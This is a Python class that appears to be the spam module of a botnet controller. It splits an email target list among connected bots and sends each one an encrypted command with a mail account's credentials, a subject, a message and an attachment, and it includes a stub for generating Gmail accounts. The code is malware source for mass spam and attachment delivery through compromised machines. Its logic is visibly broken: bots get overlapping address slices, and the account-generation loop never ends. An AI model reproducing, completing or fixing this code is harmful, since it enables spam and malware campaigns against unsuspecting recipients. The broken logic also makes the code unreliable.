

class Mail:

    def __init__(self, sub, msg, file, filename, connected, keys):
        self.mails = open("mails.txt", 'r').read().split()
        if len(self.mails)!=0:
            self.keys = keys
            self.filename = filename
            self.msg = msg
            self.sub = sub
            self.mailsToSend = ""
            self.file = file
            self.connected = connected
            self.mailsPerBot = 0
            self.mailAccounts = open("mailAccounts.txt", 'r').read().split()

            self.massMailer()


    def massMailer(self):

        c = 0
        if len(self.connected)!=0:
            self.mailsPerBot = len(self.mails) // len(self.connected)

            while len(self.connected) < len(self.mailAccounts):
                self.gmailAccountGenerator()
            for i in range(len(self.connected)):
                for z in range(self.mailsPerBot):
                    self.mailsToSend = self.mailsToSend + self.mails[z] + " "
                cmd = "%$mailSpam $mail: " + self.mailAccounts[c].split(":")[0] + " $password: " + self.mailAccounts[c].split(":")[1] + " $mailList: " + self.mailsToSend + " $subject: " + self.sub + " $filelength: " + str(len(self.file)) + " $filename: " + self.filename + " $text: " + self.msg
                print(cmd)
                self.connected[i].send(self.keys[i].encrypt(cmd.encode()))
                if(self.file):
                    self.connected[i].send(self.file)
                c+=1
        else:
            print("0 Bots online")


    def gmailAccountGenerator(self):
        #do the thing
        User = ""
        Pass = ""
        open("mailAccounts.txt", 'a').write("\n" + User + ":" + Pass)
        self.mailAccounts.append(User + ":" + Pass)
